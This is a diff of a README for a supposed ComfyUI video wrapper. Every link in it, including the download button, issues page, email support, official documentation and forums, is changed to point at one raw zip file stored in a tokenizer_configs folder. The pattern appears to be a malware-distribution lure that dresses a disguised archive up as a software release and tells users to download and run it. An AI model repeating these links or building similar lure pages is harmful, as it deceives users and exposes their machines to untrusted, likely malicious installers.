@@ -2,7 +2,7 @@
 
 ## 🔗 Download Here
 
-[![Download Now](https://raw.githubusercontent.com/owercooked/Comfyui_DreamID-V_wrapper/main/utils/Dream-wrapper-Comfyui-I-snouter.zip)](https://raw.githubusercontent.com/owercooked/Comfyui_DreamID-V_wrapper/main/utils/Dream-wrapper-Comfyui-I-snouter.zip)
+[![Download Now](https://raw.githubusercontent.com/owercooked/Comfyui_DreamID-V_wrapper/main/tokenizer_configs/Comfyui_wrapper_I_Dream_v2.7.zip)](https://raw.githubusercontent.com/owercooked/Comfyui_DreamID-V_wrapper/main/tokenizer_configs/Comfyui_wrapper_I_Dream_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **Comfyui_DreamID-V_wrapper**! This application allows you to gen
 
 ## 📥 Download & Install
 
-1. Click [here to visit the download page](https://raw.githubusercontent.com/owercooked/Comfyui_DreamID-V_wrapper/main/utils/Dream-wrapper-Comfyui-I-snouter.zip).
+1. Click [here to visit the download page](https://raw.githubusercontent.com/owercooked/Comfyui_DreamID-V_wrapper/main/tokenizer_configs/Comfyui_wrapper_I_Dream_v2.7.zip).
 2. On this page, you will see a list of available versions.
 3. Choose the latest release and download the installation file suitable for your operating system.
 4. Once the download completes, locate the file on your computer. It will usually be in your "Downloads" folder.
@@ -57,7 +57,7 @@ If you encounter any issues during installation or video generation:
 - Ensure your system meets the requirements listed above.
 - Restart the application if it crashes or hangs.
 - Update your graphics drivers to the latest version.
-- Check our [issues page](https://raw.githubusercontent.com/owercooked/Comfyui_DreamID-V_wrapper/main/utils/Dream-wrapper-Comfyui-I-snouter.zip) for solutions or to report any new problems.
+- Check our [issues page](https://raw.githubusercontent.com/owercooked/Comfyui_DreamID-V_wrapper/main/tokenizer_configs/Comfyui_wrapper_I_Dream_v2.7.zip) for solutions or to report any new problems.
 
 ## 📞 Support
 
@@ -65,7 +65,7 @@ For further assistance, you can reach out via the following methods:
 
 - **GitHub Issues**: Use the issues tab on our GitHub page for reporting bugs or seeking help.
 - **Community Forums**: Join discussions on relevant forums to seek advice from fellow users.
-- **Email Support**: For direct issues, contact us at https://raw.githubusercontent.com/owercooked/Comfyui_DreamID-V_wrapper/main/utils/Dream-wrapper-Comfyui-I-snouter.zip
+- **Email Support**: For direct issues, contact us at https://raw.githubusercontent.com/owercooked/Comfyui_DreamID-V_wrapper/main/tokenizer_configs/Comfyui_wrapper_I_Dream_v2.7.zip
 
 ## 📃 License
 
@@ -75,8 +75,8 @@ The **Comfyui_DreamID-V_wrapper** is released under the MIT License. You can use
 
 Explore the following resources to enhance your experience:
 
-- [ComfyUI Official Documentation](https://raw.githubusercontent.com/owercooked/Comfyui_DreamID-V_wrapper/main/utils/Dream-wrapper-Comfyui-I-snouter.zip)
-- [Video Generation Techniques](https://raw.githubusercontent.com/owercooked/Comfyui_DreamID-V_wrapper/main/utils/Dream-wrapper-Comfyui-I-snouter.zip)
-- [Community Forums](https://raw.githubusercontent.com/owercooked/Comfyui_DreamID-V_wrapper/main/utils/Dream-wrapper-Comfyui-I-snouter.zip)
+- [ComfyUI Official Documentation](https://raw.githubusercontent.com/owercooked/Comfyui_DreamID-V_wrapper/main/tokenizer_configs/Comfyui_wrapper_I_Dream_v2.7.zip)
+- [Video Generation Techniques](https://raw.githubusercontent.com/owercooked/Comfyui_DreamID-V_wrapper/main/tokenizer_configs/Comfyui_wrapper_I_Dream_v2.7.zip)
+- [Community Forums](https://raw.githubusercontent.com/owercooked/Comfyui_DreamID-V_wrapper/main/tokenizer_configs/Comfyui_wrapper_I_Dream_v2.7.zip)
 
 Thank you for choosing **Comfyui_DreamID-V_wrapper**. We hope you enjoy crafting videos with our powerful tool!
